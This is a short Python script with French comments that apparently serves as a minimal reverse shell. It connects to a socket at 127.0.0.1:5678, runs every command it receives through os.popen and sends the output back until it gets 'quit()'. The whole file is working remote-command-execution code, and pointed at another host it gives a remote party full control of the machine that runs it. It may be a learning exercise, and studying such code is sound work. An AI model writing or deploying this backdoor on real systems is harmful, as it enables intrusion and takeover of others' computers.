#coding:utf-8

import socket as sock
import os


# -------------Création de la configuration du socket ------------------
mon_socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
mon_socket.connect(("127.0.0.1", 5678))


# --------------------------- Prise en main --------------------------
data = ""
while data != "quit()":
    data = mon_socket.recv(1024)
    data = data.decode('UTF-8')
    result = os.popen(data).read()
    mon_socket.send(str(result).encode('UTF-8'))

mon_socket.close()
